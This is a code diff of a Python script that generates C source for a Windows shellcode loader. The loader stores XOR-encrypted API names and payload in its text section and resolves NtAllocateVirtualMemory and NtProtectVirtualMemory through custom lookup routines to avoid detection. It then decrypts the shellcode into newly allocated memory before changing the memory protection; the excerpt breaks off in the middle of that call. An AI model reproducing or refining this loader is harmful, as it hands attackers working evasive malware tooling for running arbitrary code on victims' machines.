@@ -71,8 +71,8 @@ for s in xor_c_strings_enc:
     current_offset += len(s)
 stackbuf_size = current_offset
 
-shellcode_array = bytes_to_c_array(xor_shellcode)
 combined_array = bytes_to_c_array(b"".join(xor_c_strings_enc))
+shellcode_array = bytes_to_c_array(xor_shellcode)
 key_array = bytes_to_c_array(key)
 
 c_code = f'''#include "winapi_loader.h"
@@ -103,38 +103,29 @@ __attribute__((section(".text"))) static unsigned char key[] = {{ {key_array} }}
 
 __attribute__((section(".text.start")))
 void _start() {{
-    SIZE_T size = sizeof(shellcode);
-
-#ifdef XOR
-    SIZE_T key_len = sizeof(key);
-#endif
-
     unsigned char stackbuf[{stackbuf_size}];
-    char* ntdll_dll               = (char*)&stackbuf[{offsets[0]}];
-    char* ntallocatevirtualmemory  = (char*)&stackbuf[{offsets[1]}];
-    char* ntprotectvirtualmemory   = (char*)&stackbuf[{offsets[2]}];
 
+    char* ntdll_dll = (char*)&stackbuf[{offsets[0]}];
     for (SIZE_T i = 0; i < sizeof(stackbuf); i++)
-        stackbuf[i] = enc_strings[i];
-
 #ifdef XOR
-    for (SIZE_T i = 0; i < sizeof(stackbuf); i++)
-        stackbuf[i] ^= key[i % key_len];
+        stackbuf[i] = enc_strings[i] ^ key[i % sizeof(key)];
+#else
+        stackbuf[i] = enc_strings[i];
 #endif
 
     HMODULE hNtdll = myLoadLibraryA(ntdll_dll);
 
+    char* ntallocatevirtualmemory = (char*)&stackbuf[{offsets[1]}];
     NtAllocateVirtualMemory_t pNtAllocateVirtualMemory =
         (NtAllocateVirtualMemory_t)myGetProcAddress(hNtdll, ntallocatevirtualmemory);
 
+    char* ntprotectvirtualmemory = (char*)&stackbuf[{offsets[2]}];
     NtProtectVirtualMemory_t pNtProtectVirtualMemory =
         (NtProtectVirtualMemory_t)myGetProcAddress(hNtdll, ntprotectvirtualmemory);
 
     LPVOID execMemory = NULL;
-    SIZE_T regionSize = size;
-    NTSTATUS status;
-
-    status = pNtAllocateVirtualMemory(
+    SIZE_T regionSize = sizeof(shellcode);
+    pNtAllocateVirtualMemory(
         (HANDLE)-1,
         &execMemory,
         0,
@@ -143,16 +134,15 @@ void _start() {{
         PAGE_READWRITE
     );
 
+    for (SIZE_T i = 0; i < sizeof(shellcode); i++)
 #ifdef XOR
-    for (SIZE_T i = 0; i < size; i++)
-        ((unsigned char*)execMemory)[i] = shellcode[i] ^ key[i % key_len];
+        ((unsigned char*)execMemory)[i] = shellcode[i] ^ key[i % sizeof(key)];
 #else
-    for (SIZE_T i = 0; i < size; i++)
         ((unsigned char*)execMemory)[i] = shellcode[i];
 #endif
 
     ULONG oldProtect;
-    status = pNtProtectVirtualMemory(
+    pNtProtectVirtualMemory(
         (HANDLE)-1,
         &execMemory,
         &regionSize,
